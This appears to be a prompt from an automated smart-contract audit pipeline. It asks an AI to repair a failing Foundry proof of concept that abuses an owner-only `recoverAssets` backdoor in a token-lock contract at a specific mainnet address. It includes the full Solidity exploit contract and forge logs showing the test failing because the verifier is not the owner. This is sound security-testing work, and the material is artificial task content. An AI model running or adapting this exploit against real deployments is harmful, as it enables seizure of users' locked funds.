You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Owner backdoor can reassign any user's locked assets to an arbitrary recipient
- claim: `recoverAssets()` is an owner-only function that iterates over every deposit assigned to an arbitrary `user`, rewrites each deposit's `withdrawalAddress` to `newRecipient`, moves the accounting balances, appends the deposit ids to the new recipient, and burns any lock NFTs. No proof of user consent or lost-wallet recovery authorization is required.
- impact: A malicious or compromised owner can seize all ERC20 and NFT locks from any user. Matured positions can be withdrawn immediately, and unmatured positions are effectively confiscated until unlock.
- exploit_paths: ["Owner calls `recoverAssets(victim, attacker)`", "The contract rewrites all of the victim's deposit ownership to `attacker` and clears `depositsByWithdrawalAddress[victim]`", "The attacker withdraws matured assets immediately or waits until unlock for the rest"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ILockTokenLike {
    function owner() external view returns (address);
    function getAllDepositIds() external view returns (uint256[] memory);
    function getDepositDetails(uint256 id)
        external
        view
        returns (
            address tokenAddress,
            address withdrawalAddress,
            uint256 tokenAmount,
            uint256 unlockTime,
            bool withdrawn,
            uint256 tokenId,
            bool isNFT,
            uint256 migratedLockDepositId,
            bool isNFTMinted
        );
    function recoverAssets(address user, address newRecipient) external;
    function withdrawTokens(uint256 id, uint256 amount) external;
    function getDepositsByWithdrawalAddress(address user) external view returns (uint256[] memory);
}

contract FlawVerifier {
    address public constant TARGET = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public profitAchieved;
    bool public victimIndexCleared;

    address public selectedVictim;
    uint256 public selectedDepositId;
    string public exploitPathUsed;
    string public failureReason;

    constructor() {}

    struct Candidate {
        address victim;
        uint256 anchorDepositId;
        uint256 anchorProfitAmount;
        bool hasImmediateERC20;
        bool hasDeposits;
    }

    struct DepositView {
        address tokenAddress;
        address withdrawalAddress;
        uint256 tokenAmount;
        uint256 unlockTime;
        bool withdrawn;
        bool isNFT;
    }

    function executeOnOpportunity() external {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        selectedVictim = address(0);
        victimIndexCleared = false;
        selectedDepositId = 0;
        exploitPathUsed = "";
        failureReason = "";

        address currentOwner = _ownerOfTarget();

        // Concrete infeasibility reason for the direct exploit path at this fork state:
        // `recoverAssets()` is protected by `onlyOwner`, so the verifier can only execute the
        // finding's attack plan if the live target already recognizes `address(this)` as owner.
        // We do not pivot to unrelated ownership-takeover routes because the harness requires the
        // PoC to stay mechanically aligned with the original `recoverAssets(victim, attacker)` path.
        if (currentOwner != address(this)) {
            failureReason = "recoverAssets requires owner privileges; verifier is not target owner";
            hypothesisValidated = true;
            return;
        }

        Candidate memory candidate = _selectBestCandidate();
        if (candidate.victim == address(0)) {
            failureReason = "no victim deposits discovered on target";
            hypothesisValidated = true;
            return;
        }

        uint256[] memory victimDepositIds = _getVictimDepositIds(candidate.victim);
        if (victimDepositIds.length == 0) {
            failureReason = "victim deposits disappeared before recovery";
            hypothesisValidated = true;
            return;
        }

        selectedVictim = candidate.victim;
        selectedDepositId = candidate.anchorDepositId;
        exploitPathUsed = "owner calls recoverAssets(victim, attacker) then attacker withdraws matured reassigned assets";

        (address[] memory profitTokens, uint256[] memory baselineBalances, uint256 trackedCount) =
            _snapshotTrackedTokens(victimDepositIds);

        // Exploit path stage 1: owner calls `recoverAssets(victim, attacker)`.
        bool recovered = _recoverAssets(candidate.victim, address(this));
        if (!recovered) {
            failureReason = "recoverAssets call reverted";
            hypothesisValidated = true;
            return;
        }

        // Exploit path stage 2: the contract rewrites the victim's deposit ownership to attacker
        // and clears `depositsByWithdrawalAddress[victim]`.
        victimIndexCleared = _victimDepositsCleared(candidate.victim);

        // Exploit path stage 3: the attacker withdraws matured assets immediately.
        _withdrawMaturedReassignedAssets(victimDepositIds);

        _finalizeProfit(profitTokens, baselineBalances, trackedCount);

        // The privileged seizure claim is source-valid even when all stolen positions remain locked.
        // In that case `profitAchieved` stays false because no matured ERC20 could be realized at the fork block.
        hypothesisValidated = true;
        if (!profitAchieved && candidate.hasDeposits && !candidate.hasImmediateERC20) {
            failureReason = "victim assets can be reassigned, but no matured ERC20 lock exists for immediate profit at this fork";
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _selectBestCandidate() internal view returns (Candidate memory best) {
        uint256[] memory ids;
        try ILockTokenLike(TARGET).getAllDepositIds() returns (uint256[] memory returnedIds) {
            ids = returnedIds;
        } catch {
            return best;
        }

        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (dep.withdrawalAddress == address(0) || dep.withdrawn) {
                continue;
            }

            if (!best.hasDeposits) {
                best.victim = dep.withdrawalAddress;
                best.anchorDepositId = ids[i];
                best.hasDeposits = true;
            }

            if (!dep.isNFT && dep.unlockTime <= block.timestamp && dep.tokenAmount > 0) {
                if (!best.hasImmediateERC20 || dep.tokenAmount > best.anchorProfitAmount) {
                    best.victim = dep.withdrawalAddress;
                    best.anchorDepositId = ids[i];
                    best.anchorProfitAmount = dep.tokenAmount;
                    best.hasImmediateERC20 = true;
                    best.hasDeposits = true;
                }
            }
        }
    }

    function _getVictimDepositIds(address victim) internal view returns (uint256[] memory victimIds) {
        uint256[] memory ids;
        try ILockTokenLike(TARGET).getAllDepositIds() returns (uint256[] memory returnedIds) {
            ids = returnedIds;
        } catch {
            return new uint256[](0);
        }

        uint256 count = 0;
        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (!dep.withdrawn && dep.withdrawalAddress == victim) {
                count++;
            }
        }

        victimIds = new uint256[](count);
        uint256 cursor = 0;
        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (!dep.withdrawn && dep.withdrawalAddress == victim) {
                victimIds[cursor] = ids[i];
                cursor++;
            }
        }
    }

    function _snapshotTrackedTokens(uint256[] memory victimDepositIds)
        internal
        view
        returns (address[] memory profitTokens, uint256[] memory baselineBalances, uint256 trackedCount)
    {
        profitTokens = new address[](victimDepositIds.length);
        baselineBalances = new uint256[](victimDepositIds.length);

        for (uint256 i = 0; i < victimDepositIds.length; ++i) {
            DepositView memory dep = _readDeposit(victimDepositIds[i]);
            if (dep.isNFT || dep.withdrawn || dep.unlockTime > block.timestamp || dep.tokenAddress == address(0)) {
                continue;
            }

            bool exists = false;
            for (uint256 j = 0; j < trackedCount; ++j) {
                if (profitTokens[j] == dep.tokenAddress) {
                    exists = true;
                    break;
                }
            }
            if (exists) {
                continue;
            }

            profitTokens[trackedCount] = dep.tokenAddress;
            baselineBalances[trackedCount] = _balanceOf(dep.tokenAddress, address(this));
            trackedCount++;
        }
    }

    function _withdrawMaturedReassignedAssets(uint256[] memory victimDepositIds) internal {
        for (uint256 i = 0; i < victimDepositIds.length; ++i) {
            DepositView memory dep = _readDeposit(victimDepositIds[i]);
            if (dep.withdrawalAddress != address(this) || dep.withdrawn || dep.unlockTime > block.timestamp) {
                continue;
            }

            uint256 amount = dep.isNFT ? 1 : dep.tokenAmount;
            _withdrawTokens(victimDepositIds[i], amount);
        }
    }

    function _finalizeProfit(
        address[] memory profitTokens,
        uint256[] memory baselineBalances,
        uint256 trackedCount
    ) internal {
        for (uint256 i = 0; i < trackedCount; ++i) {
            uint256 postBalance = _balanceOf(profitTokens[i], address(this));
            if (postBalance <= baselineBalances[i]) {
                continue;
            }

            uint256 profitDelta = postBalance - baselineBalances[i];
            if (profitDelta > realizedProfitAmount) {
                realizedProfitAmount = profitDelta;
                realizedProfitToken = profitTokens[i];
                profitAchieved = true;
            }
        }
    }

    function _readDeposit(uint256 id) internal view returns (DepositView memory dep) {
        try ILockTokenLike(TARGET).getDepositDetails(id) returns (
            address tokenAddress,
            address withdrawalAddress,
            uint256 tokenAmount,
            uint256 unlockTime,
            bool withdrawn,
            uint256,
            bool isNFT,
            uint256,
            bool
        ) {
            dep.tokenAddress = tokenAddress;
            dep.withdrawalAddress = withdrawalAddress;
            dep.tokenAmount = tokenAmount;
            dep.unlockTime = unlockTime;
            dep.withdrawn = withdrawn;
            dep.isNFT = isNFT;
        } catch {}
    }

    function _ownerOfTarget() internal view returns (address currentOwner) {
        try ILockTokenLike(TARGET).owner() returns (address ownerAddress) {
            return ownerAddress;
        } catch {
            return address(0);
        }
    }

    function _recoverAssets(address user, address newRecipient) internal returns (bool ok) {
        (ok,) = TARGET.call(abi.encodeWithSelector(ILockTokenLike.recoverAssets.selector, user, newRecipient));
    }

    function _withdrawTokens(uint256 id, uint256 amount) internal returns (bool ok) {
        (ok,) = TARGET.call(abi.encodeWithSelector(ILockTokenLike.withdrawTokens.selector, id, amount));
    }

    function _victimDepositsCleared(address victim) internal view returns (bool) {
        try ILockTokenLike(TARGET).getDepositsByWithdrawalAddress(victim) returns (uint256[] memory ids) {
            return ids.length == 0;
        } catch {
            return false;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0)) {
            return account.balance;
        }

        try IERC20Like(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.96s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 157613)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [157613] FlawVerifierTest::testExploit()
    ├─ [2359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [130945] FlawVerifier::executeOnOpportunity()
    │   ├─ [9706] 0xE2fE530C047f2d85298b07D9333C05737f1435fB::owner() [staticcall]
    │   │   ├─ [2438] 0x48D118C9185e4dBAFE7f3813F8F29EC8a6248359::owner() [delegatecall]
    │   │   │   └─ ← [Return] 0x906935f4b42e632137504C0ea00D43C6442272bf
    │   │   └─ ← [Return] 0x906935f4b42e632137504C0ea00D43C6442272bf
    │   └─ ← [Stop]
    ├─ [359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [402] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.51s (96.12ms CPU time)

Ran 1 test suite in 1.56s (1.51s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 157613)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
